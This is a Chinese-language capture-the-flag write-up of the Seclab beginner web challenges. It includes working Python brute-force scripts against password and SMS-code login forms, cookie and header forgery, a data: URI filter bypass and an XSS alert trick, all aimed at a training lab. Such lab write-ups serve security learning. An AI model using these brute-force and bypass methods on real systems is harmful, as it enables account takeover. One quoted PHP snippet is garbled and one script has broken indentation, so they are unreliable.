---
title: "WriteUp - Seclab"
description: 读书时的碎碎念
date: 2018-03-18T21:14:23+08:00
tags:
    - Security
Categories:
    - Security
---

前言：重新开始学习安全，用这个水题来暖手，当初步复习。

看了下自己五个月之前的状态:

![img](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/71610715.jpg)

------

## 基础关

1. key在哪里？

   右键查看源代码，得到key

   ![img](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/29089604.jpg)

2. 再加密一次你就得到key啦~

   这题做不来，看的writeup，用的rot13加密，学习一下! rot13加密

   ```
    百科链接：http://www.baike.com/wiki/ROT13&prd=so_1_doc
   
    ROT13（回转13位，rotateby13places，有时中间加了个减号称作ROT-13）是一种简易的置换暗码。ROT13是它自己本身的逆反；也就是说，要还原ROT13，套用加密同样的演算法即可得，故同样的操作可用再加密与解密。该演算法并没有提供真正的密码学上的保全，故它不应该被套用在需要保全的用途上。它常常被当作弱加密范例的典型。
   
    描述：套用ROT13到一段文字上仅仅只需要检查字元字母顺序并取代它在13位之后的对应字母，有需要超过时则重新绕回26英文字母开头即可[2]。A换成N、B换成O、依此类推到M换成Z，然后序列反转：N换成A、O换成B、最后Z换成M。只有这些出现在英文字母里头的字元受影响；数字、符号、空白字元以及所有其他字元都不变。因为只有在英文字母表里头只有26个，并且26=2×13，ROT13函数是它自己的逆反：
            对任何字元x：ROT13(ROT13(x))=ROT26(x)=x。
    换句话说，两个连续的ROT13应用函式会回复原始文字（在数学上，这有时称之为对合（involution）；在密码学上，这叫做对等加密（reciprocalcipher））。
    
   ```

   所以最后结果是按照下表一一对应即可，数字不变

   ![img](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/29344178.jpg)

3. 猜猜这是经过了多少次加密？

   看到加密后字符串最后是个等号，依稀记得base64加密最后也是个等号，猜测是base64加密，于是脚本解密如下:

   脚本编写时要注意，base64碰到无法解密之后会报错

   ```
    import base64
   
    code = 'Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZacVFtRlRNbEpJVm10a1dHSkdjRTlaVjNSR1pVWmFkR05GU214U2JHdzFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm1wT1QwMHhjRlpYYlhSWFRWaENSbFpYZUZOVWJVWTJVbFJDVjAxdVVuWlZha1pYWkVaT2NscEdhR2xTTW1ob1YxWlNTMkl4U2tkWGJHUllZbFZhY1ZadGRHRk5SbFowWlVaT1ZXSlZXVEpWYkZKSFZqRmFSbUl6WkZkaGExcG9WakJhVDJOdFJraGhSazVzWWxob1dGWnRNWGRVTVZGM1RVaG9hbEpzY0ZsWmJGWmhZMnhXY1ZGVVJsTk5XRUpIVmpKNFQxWlhTa2RqUm14aFUwaENTRlpxUm1GU2JVbDZXa1prYUdFeGNHOVdha0poVkRKT2RGSnJhR2hTYXpWeldXeG9iMWRHV25STldHUlZUVlpHTTFSVmFHOWhiRXB6WTBac1dtSkdXbWhaTVZwaFpFZFNTRkpyTlZOaVJtOTNWMnhXYjJFeFdYZE5WVlpUWVRGd1YxbHJXa3RUUmxweFVtMUdVMkpWYkRaWGExcHJZVWRGZUdOSE9WZGhhMHBvVmtSS1QyUkdTbkpoUjJoVFlYcFdlbGRYZUc5aU1XUkhWMjVTVGxOSFVuTlZha0p6VGtaVmVXUkhkRmhTTUhCSlZsZDRjMWR0U2tkWGJXaGFUVzVvV0ZsNlJsZGpiSEJIV2tkc1UySnJTbUZXTW5oWFdWWlJlRmRzYUZSaVJuQlpWbXRXZDFZeGJISlhhM1JVVW14d2VGVXlkR0ZpUmxwelYyeHdXR0V4Y0hKWlZXUkdaVWRPUjJKR2FHaE5WbkJ2Vm10U1MxUnRWa2RqUld4VllsZG9WRlJYTlc5V1ZscEhXVE5vYVUxWFVucFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaHBVbGhCZDFac1pEUmpNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVk5yWkZOaVJrcDZWa2N4YzFVeVNuSlRiVVpYVFc1b1dGZFdXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZaZUdKSVNsaGhNMUpVVlcxNGQyVkdWbGRoUnpsb1RWWndlbFl5Y0VkV01ERjFZVWhLV2xaWFVrZGFWM2hIWTIxS1IyRkdhRlJTVlhCS1ZtMTBVMU14VlhoWFdHaFlZbXhhVjFsc1pHOVdSbXhaWTBaa2JHSkhVbGxhVldNMVlWVXhXRlZyYUZkTmFsWlVWa2Q0YTFOR1ZuTlhiRlpYWWtoQ1NWWkdVa2RWTVZwMFVtdG9VRll5YUhCVmJHaERUbXhrVlZGdFJtcE5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrNXlXa1pPYVZKcmNEWldhMk40WXpGVmVWTnVTbFJpVlZwWVZGYzFiMWRHWkZkWGJFcHNVbTFTZWxsVldsTmhWa3AxVVd4d1YySllVbGhhUkVaYVpVZEtTVk5zYUdoTk1VcFZWbGN4TkdReVZrZFdXR3hyVWpOU2IxbHNWbmRXTVZwMFkwZEdXR0pHY0ZoWk1HUnZWMnhhV0ZWclpHRldWMUpRVlRCVk5WWXhjRWhoUjJoT1UwVktNbFp0TVRCVk1VMTRWVmhzVm1FeVVsWlpiWFIzWVVaV2RHVkZkR3BTYkhCNFZrY3dOVll4V25OalJXaFlWa1UxZGxsV1ZYaFhSbFoxWTBaa1RsWXlhREpXTVZwaFV6RkplRlJ1VmxKaVJscFlWRlJHUzA1c1drZFZhMlJXVFZad01GVnRkRzlWUmxwMFlVWlNWVlpYYUVSVk1uaGhZekZ3UlZWdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp1Y0Zka2JGbDNWMjVLYkZKdFVubGFSV1IzWVZaYWNtTkZiRmRpUjFFd1ZrUktSMVl4VGxsalJuQk9UVzFvV1ZkV1VrZGtNa1pIVjJ4V1UySkdjSE5WYlRGVFRWWlZlV042UmxoU2EzQmFWVmMxYjFZeFdYcGhTRXBWWVRKU1NGVnFSbUZYVm5CSVlVWk9WMVpHV2xaV2JHTjRUa2RSZVZaclpGZGlSMUp2Vlc1d2MySXhVbGRYYm1Sc1lrWnNOVmt3Vm10V01ERkZVbXBHV2xaWGFFeFdNbmhoVjBaV2NscEhSbGROTW1oSlYxUkplRk14U1hoalJXUmhVbFJXVDFWc2FFTlRNVnAwVFZSQ1ZrMVZNVFJXYkdodlYwWmtTR0ZHYkZwaVdHaG9WbTE0YzJOc2NFaFBWM0JUWWtoQ05GWnJZM2RPVmxsNFYyNVNWbUpIYUZoV2FrNU9UVlphV0dNemFGaFNiRnA1V1ZWYWExUnRSbk5YYkZaWFlUSlJNRmRXV2t0ak1WSjFWRzFvVTJKR2NGbFhWM2hoVW0xUmVGZHVSbEppVlZwaFZtMHhVMU5XV2xoa1J6bG9UVlZ3TUZsVldsTldWbHBZWVVWU1ZrMXVhR2haZWtaM1VsWldkR05GTlZkTlZXd3pWbXhTUzAxSFNYbFNhMlJVWW1zMVZWbHJaRzlXYkZwMFpVaGtUazFXYkROV01qVkxZa1pLZEZWdWJHRlNWMUl6V1ZaYVlXTnRUa1ppUm1ScFVqRkZkMWRXVWt0U01WbDRWRzVXVm1KRlNsaFZiRkpYVjFaYVIxbDZSbWxOVjFKSVdXdG9SMVpIUlhoalNFNVdZbFJHVkZZeWVHdGpiRnBWVW14a1RsWnVRalpYVkVKaFZqRmtSMWRZY0ZaaWEzQllWbXRXWVdWc1duRlNiR1JxVFZkU2VsbFZaSE5XTVZwMVVXeEdWMkV4Y0doWFZtUlNaVlphY2xwR1pGaFNNMmg1VmxkMFYxTXhaRWRWYkdSWVltMVNjMVp0TVRCTk1WbDVUbGQwV0ZKcmJETldiWEJUVjJzeFIxTnNRbGROYWtaSFdsWmFWMk5zY0VoU2JHUk9UVzFvU2xZeFVrcGxSazE0VTFob2FsSlhhSEJWYlRGdlZrWmFjMkZGVGxSTlZuQXdWRlpTUTFack1WWk5WRkpYWWtkb2RsWXdXbXRUUjBaSFlrWndhVmRIYUc5V2JYQkhZekpOZUdORmFGQldiVkpVV1d4b2IxbFdaRlZSYlVab1RXdHdTVlV5ZEc5V2JVcElaVWRvVjJKSFVrOVVWbHB6VmpGYVdXRkdhRk5pUm5BMVYxWldZV0V4VW5SU2JrNVlZa1phV0ZsVVNsSk5SbFkyVW10MGFrMVlRa3BXYlhoVFlWWktjMk5HYkZoV00xSm9Xa1JCTVdNeFpISmhSM2hUVFVad2FGWnRNSGhWTVVsNFZXNU9XR0pWV2xkVmJYaHpUbFpzVm1GRlRsZGlWWEJKV1ZWV1QxbFdTa1pYYldoYVpXdGFNMVZzV2xka1IwNUdUbFprVGxaWGQzcFdiWGhUVXpBeFNGTlliRk5oTWxKVldXMXpNVlpXYkhKYVJ6bFhZa1p3ZWxZeU5XdFVhekZYWTBoc1YwMXFSa2haVjNoaFkyMU9SVkZ0UmxOV01VWXpWbTF3UzFNeVRuTlVia3BxVW0xb2NGVnRlSGRsVm1SWlkwVmtWMkpXV2xoV1J6VlBZVlpLZFZGck9WVldla1oyVmpGYWExWXhWbkphUjNST1lURndTVlpxU2pSV01WVjVVMnRrYWxORk5WZFpiRkpIVmtaU1YxZHNXbXhXTURReVZXMTRhMVJzV25WUmFscFlWa1ZLYUZacVJtdFNNV1IxVkd4U2FFMXRhRzlXVjNSWFdWZE9jMVp1UmxSaE0xSlZWbTE0UzAxR2JGWlhhemxYVFZad1NGWXljRXRXTWtwSVZHcFNWV0V5VWxOYVZscGhZMnh3UjFwR2FGTk5NbWcxVm14a2QxUXhWWGxUV0docFUwVTFXRmx0TVZOWFJsSlhWMjVrVGxKdGRETlhhMVpyVjBaSmQyTkZhRnBOUm5CMlZqSnplRk5HVm5WWGJHUk9ZbTFvYjFacVFtRldNazV6WTBWb1UySkhVbGhVVmxaM1ZXeGFjMVZyVG1oTlZXdzBWVEZvYzFVeVJYbGhTRUpXWWxoTmVGa3dXbk5XVmtaMVdrVTFhVkp1UVhkV1JscFRVVEZhY2sxV1drNVdSa3BZVm01d1YxWkdXbkZUYTFwc1ZteGFNVlZ0ZUdGaFZrbDRVbGhrVjJKVVJUQlpla3BPWlVkT1JtRkdRbGRpVmtwVlYxZDBWMlF4WkhOWGEyaHNVak5DVUZadGVITk9SbGw1VGxaT1YySlZjRWxaVlZwdlZqSkdjazVWT1ZWV2JIQm9WakJrVG1WdFJrZGhSazVwVW01Qk1sWXhXbGRaVjBWNFZXNU9XRmRIZUc5VmExWjNWMFpTVjFkdVpHaFNiRmt5VlcxME1HRnJNVmRUYWtaWFZqTm9VRmxXV2twbFJrNTFXa1prYUdFd2NGaFdSbFpXWlVaSmVGcElTbWhTTTFKVVZGVmFkMlJzV2tkYVNIQk9WakZhZWxZeGFITlVNVnB5VGxjNVZWWnNXak5VVlZwaFYwVTFWbFJzWkU1aE0wSktWMVpXVjFVeFdsaFRiR3hvVWpKb1dGbHJXbmRWUmxwelYydDBhazFXY0hsVWJGcHJZVmRGZDFkWWNGZGlXR2h4V2tSQmVGWXhVbGxoUm1ob1RXMW9WbGRYZEd0aU1rbDRWbTVHVW1KVldsaFphMXAzVFVad1ZtRkhkRlZoZWtaYVZWZDRjMWxXV2xoaFJYaGFZVEZ3WVZwVldtdGpiVTVIWVVkb1RsZEZTbEpXYlRGM1V6RktkRlpyYUZWaE1WcFlXV3RrVTFaR1ZuTlhibVJzVm0xU1dsa3dWbXRXTWtwWFVtcE9WVlpzV25wWlZscEtaVmRHUjFWc2NHbFNNbWd5Vm1wR1lXRXhaRWhXYTJoUVZtdHdUMVpzVWtaTlJtUlZVVzFHV2xac2JEUlhhMVp2WVVaS2MxTnNXbGRpVkVaVVZtdGFkMWRIVmtsVWJHUnBVakZLTmxaclkzaGlNVmw1VWxod1VsZEhhRmhXYlRGU1RVWndSVkpzY0d4V2F6VjZXV3RhWVdGV1NYbGhSemxYVmpOU1dGZFdaRTlqTVZwMVVteFNhRTB4U2xaV2JURjZUVlV4UjFadVVteFNWR3h3VldwQ2QxZHNiRlpWYkU1WFRVUkdXVlpXYUd0WFJscDBWV3hPWVZac2NHaFpNbmgzVWpGd1IyRkdUazVOYldjeFZtMTRhMlF4UlhoaVJtaFZZVEpTV0ZsdGVFdGpNVlYzV2taT2FrMVhlSGxXTWpWUFZERmFkVkZzWkZwV1YxRjNWakJhUzJOdFNrVlViR1JwVjBWS1ZWWnFTbnBsUmtsNFZHNU9VbUpIVWs5WlYzUmhVMFprYzFkdFJsZE5helY2V1RCV2IxVXlTa2hWYXpsVlZucEdkbFV5ZUZwbFJsWnlZMGQ0VTJGNlJUQldWRVp2WWpKR2MxTnNhRlppVjJoWFdXdGFTMWRHV2tWU2JHUnFUV3RhUjFaSGVGTlViRnAxVVZoa1YxSnNjRlJWVkVaaFkyc3hWMWRyTlZkU2EzQlpWMWQwYTJJeVVuTlhXR1JZWWxoU1ZWVnFRbUZUVm14V1YyMUdWV0pGY0RGVlZ6QTFWakpLVlZKVVFscGxhM0JRV1hwR2QxTldUblJrUms1T1RVVndWbFl4WkRCaU1VVjNUbFZrV0dKcmNHRlVWRXBUVlVaYWRHVklUazlTYkd3MVZHeFZOV0ZIU2taalJteGFWbFp3ZWxacVNrWmxSbHBaWVVkR1UwMHlhRFpXYlhCSFdWWmtXRkpyWkdoU2F6VndWVzAxUWsxc1dYaFhiR1JhVmpCV05GWlhOVTlYUm1SSVpVYzVWbUV4V2pOV01GcFRWakZrZFZwSGFGTmlSbXQ1VmxjeE1FMUhSbkpOVm1SVVlXdGFXRlpxVG05U1JscHhVMnQwVTAxck5VaFphMXB2VmpBd2VGTnFTbGRXYkVwSVZsUkdXbVZIVGtaaVJsWnBVakpvZDFadGVHRmtNV1JIVjJ0a1dHSlZXbkZVVlZKWFUwWlplR0ZJVGxWTlZuQjVWR3hqTlZaV1duTlhibkJWWWtad2VsWnRNVWRTYkZKeldrZHNWMWRGU2t0V01WcFhWakZWZUZkWVpFNVdiVkp4VldwS2IxbFdVbGRYYm1SV1VtMTBORll5ZUd0aGF6RllWVzVzVldKR2NISldSM2hoVjBkUmVtTkdaR2xYUjJoVlZsaHdRbVZHVGtkVWJHeHBVbXMxYjFSWGVFdFdiR1JZVFZod1RsWnNjRmhaYTJoTFdWWktObUpHYUZwaE1YQXpXbGQ0V21WVk5WaGtSbFpvWld0YVdsZHNWbUZoTVZsM1RWaEdWMkpyY0ZoV2ExWjNWRVpWZUZkclpHcGlWVnBJVjJ0YVQxUnJNWFJoUmxwWFlsUkdNMVY2Ums1bFZsSjFWR3hXYVdFelFuWldWekI0VlRGYVIxVnNWbFJpVkd4d1ZGWmFkMlZXV2xoa1JFSldUVVJHV1ZaWGRHOVdhekYxWVVod1dGWnNjRXRhVjNoSFl6RldjMXBIYUdobGJGbDVWbTF3UjFsWFJYaGFSV2hYWVRKb1VWWnRkSGRVTVZwMFpFaGtWRlp0VWxaVlZ6RkhZVlV4Y2xkcVFsZGlWRlpNVmpCa1MxTkhWa2RhUm5CcFVqSm9WVlpHVWtka01WbDRXa2hTYTFJelFuQlZha1pLWkRGYVJWSnRkR2xOVm13elZGWldhMkZGTUhsbFJtaGFZa1pLUTFwVlduTmpWa3B6WTBkNFUySldTalZXYWtvMFZUSkdXRk5yYkZKaVIyaFlXV3hvVTFkR1pGZGFSbVJxVFZkU01WVnRlRTloVmtsNFUyNW9WMUpzY0hKV1ZFcFhZekpLUjFkdFJsUlNWRloyVm0weE5HUXlWbGRoTTJSV1lsVmFXRlJWVWtkWFZscFhZVWQwV0ZKc2NEQldWM2hQV1ZaYWMyTkhhRnBOYm1nelZXcEdkMUl5UmtkVWF6Vk9ZbGRqZUZadE1UUmhNREZIVjFob1ZWZEhhR2hWYkdSVFZqRnNjbHBHVGxoV2JYZ3dWRlphVDJGck1WZGpSRUpoVmxkb1VGWkVSbUZrVmtaeldrWndWMVl4UmpOV2FrSmhVMjFSZVZScldtaFNia0pQVlcwMVEwMXNXbkZUYm5Cc1VtczFTVlZ0ZEdGaVJrcDBWV3M1V21KVVJuWlpha1poWTFaR2RGSnNaRTVoZWxZMlYxUkNWMkl4VlhsVGEyaFdZa2RvVmxadGVHRk5NVnBZWlVkR2FrMVdXbmxXUjNocllVZFdjMWRzYkZkaGExcDJXV3BLUjJNeFRuTmhSMmhUWlcxNFdGZFdaREJrTWxKelYydFdVMkpHY0hKVVZscDNaVlp3UmxaVVJtaFdhM0F4VlZab2ExZEhTa2RYYmtaVllrZFNSMXBFUVhoV01XUnlUbFprVTJFelFscFdiVEIzWlVkSmVWVnVUbGhYUjFKWldXeG9VMVpXVm5GUmJVWlVZa1phTUZwVlpFZGhSbHB5WWtSU1ZtSkhhSEpXYWtwTFZsWktWVkZzY0d4aE0wSlFWMnhXWVdFeVVsZFdiazVWWWxkNFZGUldWbmRXYkZsNFdrUkNWMDFzUmpSWGEyaFBWMGRGZVdGSVRsWmhhelZFVmxWYVlXUkZNVmRVYkZKVFlrZDNNVlpIZUZaT1YwWklVMnRhYWxKRlNtaFdiR1JUVTBaYWMxZHRSbGROYXpWSVYydGFWMVl5U2tsUmFscFhZbGhDU0ZkV1dtdFhSa3B5WVVkd1UwMXVhRmxXYWtKWFV6Rk9SMWR1VW14U00xSlFWV3BDVjA1R1dsaE9WazVXVFd0d2VWUnNXbk5YYlVWNFkwZG9WMDFXY0doYVJWVjRWakZPY2s1V1RtbFNiWFExVm14amQyVkdTWGxTYmxKVFlXeHdXRmxyWkc5WlZteFZVbTVrVlZKdGVGaFdNblF3WVdzeGNrNVZhRnBoTVhCMlZtcEJkMlZHVG5SUFZtaG9UVlZ3U1ZkV1VrZFhiVlpIWTBWc1ZHSlhhRlJVVkVaTFZsWmFSMVp0Um10TlYxSllWakowYTFsV1RrbFJiazVXWWtaS1dGWXdXbUZrUlRWWFZHMW9UbFpYT0hsWFYzUmhZVEZhZEZOc2JHaFRTRUpXV1d0YWQyVnNXblJOVldSVFlrWktlbGRyWkhOV01XUkdVMnQwVjAxV2NGaFdha1pXWlVaa1dWcEZOVmRpVmtwNFZsZHdTMkl4YkZkVmJHUllZbTFTVjFWdE1UQk9SbGw1WlVkMGFHRjZSbGxXVnpWelZsZEtSMk5JU2xkU00yaG9WakJrVW1WdFRrZGFSMnhZVWpKb1ZsWnNhSGRSYlZaSFZHdGtWR0pIZUc5VmFrSmhWa1phY1ZOdE9WZGlSMUpaV2tWa01HRlZNWEppUkZKWFlsUldWRlpIZUdGT2JVcElVbXhrYVZkSFozcFhiRnBoV1ZkU1JrMVdXbUZTYkZwdldsZDBZVmRzWkhOV2JVWm9UVlpzTTFSV2FFZFdNa3B5WTBab1YyRXhXak5XUlZwV1pVWmtjbHBIY0dsV1ZuQkpWakowWVZReFVuSk5XRkpvVW14d1dGbHNVa2ROTVZZMlVtczFiRlpzU2pGV1IzaFhZVmRGZWxGdWFGZFdla0kwV1dwS1QxSXhXblZWYlhoVVVqRktkMVpHV210Vk1XUkhWMnhvYTFKRlNsZFVWVkpIVjBac2NsVnNUbGROVld3MldWVm9kMWRzV1hwaFJYaGhVbXh3U0ZreWN6VldNVnB6V2tkNGFFMVhPVFZXYlRGM1VqRnNWMkpHWkZSWFIyaHdWV3RhZDFaR2JITmFSRkpWVFZad2VGVnRkREJXUmxwelkwaG9WazFXU2toV1ZFRjRWakZhY1Zac1drNWliRXB2VjFaa05GUXhTbkpPVm1SaFVtNUNjRlZ0ZEhkVFZscDBaRWRHV0dKV1dsbFdiWFJ2WVRGSmVsRnVRbFppVkZaRVZtcEdZVmRGTVZWVmJXeE9WbXhaTVZaWGVHOWtNVlowVTJ4YVdHSkhhRmhaYkZKSFZURlNWbGR1VGs5aVJYQXdXa1ZhVDFSc1dYaFRXR2hYWWtkUk1GZFdaRWRUUms1eVlrWkthVkl4U2xsWFYzaFRVbXN4UjJORlZsUmlSMUp4VkZaa1UwMVdWblJsUlRsb1ZtdHNORlV5Tlc5V01VcHpZMGhLVjFaRmNGaFpla3BMVWpGa2RGSnNVbE5XUmxveVZtMHdlRTVIVVhsV2JHUm9UVEpTV1ZsdE1WTlhSbEpZWkVoa1ZGWnNjRWxaTUZwUFZqRlpkMVpxVmxkV00yaFFWMVphWVdNeVRraGhSbkJPWW0xbmVsWlhjRWRrTVU1SVUydG9hVkpyTlZsVmJGWjNWVEZhZEUxSVpHeFNWRlpKVld4b2IxWXhaRWhoUjJoV1lrZFNWRlpxUm5OamJHUjFXa1prVGxZemFGZFdWRW8wVkRKR2NrMVdaR3BTUlVwb1ZteGFXbVF4YkhKYVJYUlRUV3MxUmxWWGVGZFdNVnB5WTBac1YySllRa05hVlZwTFZqRk9kVlJ0UmxOaWEwcDNWMWN4TUZNeFVsZFhibEpPVTBkb1ZWUldaRk5YUmxwMFRsWmtXRkl3Y0VsV1Z6QTFWMnhhUmxkcVRscGhhMXBvVmpCVmVGWldWblJoUlRWb1pXeFdNMVp0TUhoTlIwVjRZa1prVkZkSGVHOVZibkJ6Vm14YWNsWnJkRlZTYkhCWldsVmtSMkZyTVZoa1JGcGFWbFpWTVZaVVNrdFhWMFpIWTBaa2FFMVlRakpYVjNCTFVqSk5lRlJ1VG1oU01taFZWV3hXZDFkR1pGaGxSemxWWWxaYVNGWXlkRmRWTWtwV1YyNUdWVlp0VWxSYVYzaHlaREZ3UlZWdGFGZGhNMEY0VmxaYWIyRXhaRWhUYTJSWVltdHdWMWxYZEdGaFJtdDVZek5vVjAxWFVqQlphMXBQVlRKRmVsRnRPVmROVm5CVVZXcEtVbVZXVW5WVWJHaFlVakZLYjFaWGVHOVZNazVYWWtoT1YxWkZXbFJVVmxwSFRrWlplVTFVUW1oU2JIQXdWbGQwYzFkSFJuSk9WRTVYWVd0d1NGa3llRTlrUjBaSFkwZDRhRTFZUWpWV2JYQkRXVlpWZVZSdVRtcFNWMmhVV1d0Vk1XTkdXblJrU0dSWFlrWnNORmRyVWtOWGJGbDRVbXBPVldKR2NISldNR1JMWXpGT2NrOVdaR2hOVm5CTlZqRmFZVmxYVWtoV2ExcGhVbFJzVkZscmFFSmtNV1J6Vm0xR2FFMVdjRmxWTW5SaFlXeEtXR1ZIUmxWV1JUVkVXbFphVjFJeFNsVmlSa1pXVmtSQk5RPT0='
   
    while True:
        try:
            code = base64.b64decode(code)
        except:
            print(code)
                    break
    
   ```

4. 据说MD5加密很安全，真的是么？

   那么很好判断了，md5加密的，拿到cmd5解密，得到key

5. 种族歧视

   改请求头，Accept-Language条目中的zh-CN,zh;删除之后访问即可

6. HAHA浏览器

   依旧是改请求头，User-Agent条目一行的内容替换成HAHA之后访问即可

7. key究竟在哪里呢？

   用firefox自带的web控制台查看页面返回头，看到有个key条目….

8. key又找不到了

   bp，先抓一次search_key.php,过去发现里面一个a标签藏着个链接key_is_herenow.php访问得到key

9. 冒充登陆用户

   内容说必须要登录才能得到key，于是bp抓包发现请求头里的cookie

   ```
    cookie:Login=0
    
   ```

   把0改成1访问得到key

10. 比较数字大小

    tips说只要比服务器上的数字即可，于是看源代码发现input框maxlength=3，直接web控制台修改然后一路999999999999999999999打过去，得到key

11. 本地的诱惑

    估计这道题是要改请求头里的ip头的改成127.0.0.1，但是右键查看源代码直接就发现php代码都告诉key了…

12. 就不让你访问

    一开始以为用后台扫描器扫扫会出来，发现没有，只有一个robots.txt，纳闷，没后台，于是手动搜后台，找不到，看writeup发现需要关注一下这个robots.txt，然后看了内容发现有个disallow行，复制到url进入发现进到一个页面里，根据内容再在url后添加login.php访问得到key

## 脚本关

1. key又又找不到了

   用不着脚本，直接bp抓，得到key

2. 快速口算

   脚本如下:

   ```
    #coding:utf8
   
    import requests
    import re
   
    url = 'http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php'
   
    cookie = 'PHPSESSID=6cf93ef3760b1c0c1f1736ce6e891c91'
   
    headers = {
    'Cookie':cookie
    }
   
    req = requests.get(url=url,headers=headers)
   
    pat = '([0-9]*?)\*([0-9]*?)\+([0-9]*?)\*\(([0-9]*?)\+([0-9]*?)\)'
   
    data = re.compile(pat).findall(req.text)[0]
   
    answer = int(data[0])*int(data[1])+int(data[2])*(int(data[3])+int(data[4]))
   
    data = {
    'v':str(answer)
    }
   
    req = requests.post(url=url,headers=headers,data=data)
   
    print(req.text)
    
   ```

3. 这个题目是空的

   。。。还以为是要用bp抓包把请求头某些条目清空，结果看writeup发现 提交null即可….

4. 怎么就是不弹出key呢？

   解决方法在js代码里，根据tips要让它弹窗，把那个function弹窗的删掉点击弹窗得到key

5. 逗比验证码第一期

   tips说验证码有和没有一个样，也就是说也许可以一个验证码提交多次，于是真的可以.写个脚本循环即可得到key

   ```
    #coding:utf8
   
    import requests,re
   
    url = 'http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php'
   
    cookie = 'PHPSESSID=6cf93ef3760b1c0c1f1736ce6e891c91'
   
    headers = {
    'Cookie':cookie
    }
   
    pat = 'key'
   
    for i in range(1000,10000):
        data = {
        'username':'admin',
        'pwd':str(i),
        'vcode':'FH2S'
        }
   
        req = requests.post(url=url,headers=headers,data=data)
        if len(re.compile(pat).findall(req.text)) != 0:
            print(req.text)
            break
        else:
            print(i)
    
   ```

6. 逗比验证码第二期

   没思路看writeup说验证码直接赋空值也可以提交，于是脚本同上…

   得到经验! 一定要自己多试试目标代码的逻辑啊

7. 逗比的验证码第三期（SESSION）

   。。试了下发现亦然不验证vcode，于是脚本同上…得到key

8. 微笑一下就能过关了

   ![img](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/1757998.jpg)

   题目长这样:)这题当初也没写出来，它的php源代码给了，是这样的

   ```
    <-?php header("content-type:="" text="" html;="" charset="utf-8");" if="" (isset($_get['view-source']))="" {="" show_source(__file__);="" exit();="" }="" include('flag.php');="" $smile="1;" (!isset="" ($_get['^_^']))="" (preg_match="" ('="" \.="" ',="" $_get['^_^']))="" %="" [0-9]="" http="" $_get['^_^'])="" )="" https="" ftp="" telnet="" _="" $_server['query_string']))="" ($smile)="" (@file_exists="" ($_get['^_^']);="" ($smile="==" "(●'◡'●)")="" die($flag);="" ?-="">
    
   ```

   分析一下知道，要提交一个不同于它正则搜索内容的”微笑”才能过，那么一一尝试

   基本上是要提交一个这样的query_string

   ```
    target.cn/index.php?^_^=(●'◡'●)
    
   ```

   但是这个php里写了很多正则过滤查询，有哪些呢

   1. 不允许为 . | % | [0-9] | [http] | [https] | ftp | telnet | _

   2. 如果查询内容跟服务器本地文件有重名则也会被过滤

   3. 必须要得到一个文件内容为(●’◡’●) 的文件

      那么怎么做?

      第一步想到可以将 下划线_用url编码%5F代替；

      第二第三步怎么办呢?

      我一开始想给自己的云服务器上贴个文件，url再拉过来，但是发现过滤了http/https/ftp/telnet,怎么办，没思路，也许可以尝试url或者其它编码?

      …直到学到了data协议，这个协议是这样的，基本现在的流行浏览器都支持它，

      它定义的内容可以作为小文件插入到其它文档中，怎么定义呢?
      一般格式:

      ```
      data:[][;charset=][;base64],
      ```

      data: :协议头,它标识这个内容为一个data URI资源 mime type: test/plain 以文本格式展示, image/jpeg ,以jpeg图片形式展示 charset=

      设置编码，默认US-ASCII,可以设置charset=gbk或UTF-8,unicode等等 base64是一个可选项，设置base64编码设定 最后一项是要编写的内容，可以是纯文本编写的内容，也可以是经过base64编码的内容。 比如我们这里写成:

      ```
      data:text/plain;charset=unicode,(●'◡'●)
      ```

      所以最后的query_string构造如下:

      ![img](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/78037407.jpg)

      得到key

9. 逗比的手机验证码

   不知道这题要考什么，可能是要考 逻辑问题? 先点一次获取验证码，submit发现不对，提示需要尾号67登录，于是先用66获得验证码，再改成67登录获得key

10. 基情燃烧的岁月

    这题长这样…

    ![img](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/88350385.jpg)

    于是，先尝试向login.php爆破

    爆破脚本:

    ```
    #coding:utf8
    
    import requests
    
    url = 'http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/login.php'
    
    cookie = 'PHPSESSID=7f6cfa6d3e4fbcd3904aaf3cf6a5eeb3'
    
    headers = {
    'Cookie':cookie
    }
    
    temp_text = 'vcode or username error'
    
    d = False
    
    for vcode in range(100,1000):
        data = {
        'username':'13388886666',
        'vcode':str(vcode),
        'getcode':'1'
        }
    
        req = requests.post(url=url,headers=headers,data=data)
    
        if temp_text != req.text:
            print(req.text)
            break
    ```

    爆破出来这个…

    ![img](http://p6jpvwsnk.bkt.clouddn.com/18-5-21/88775865.jpg)

    这是暗示要爆破前任的号码? 改一下username继续爆破得到key

11. 验证码识别

    这题看来要用到验证码识别…之前写的一个验证码识别脚本改一改用来识别看看这个

    先等着改天做吧…

12. XSS基础关

    题目中js代码如下:

    ```
    orgAlert = window.alert;
    ok = 0;
    var HackingLab="success!";
    function newAlert(a) {
        window.alert = orgAlert;
        if (a == HackingLab) {
            if (ok == 0) ok = 1;
            alert(a);
            $.post("./getkey.php?ok=1",{'url':location.href,'ok':ok},function(data){
                console.log(data);
            });
            showkey();
        } else {
            alert(a);
            alert("Please use alert(HackingLab)!!");
        }
    }
    window.alert = newAlert;
    function showkey(){
    //XSS题目要自觉.....无论如何都是可以绕过的,索性不加密不编码js了,大家一起玩吧.
        var url="./getkey.php";
        $.post(url,{"getkey":"sera"},function(data){
        $("#msg").text(data);
    
        });
    }
    ```

    研究一下发现这串js代码重新定义了alert函数，界面alert一个HackingLab就可以得到key了

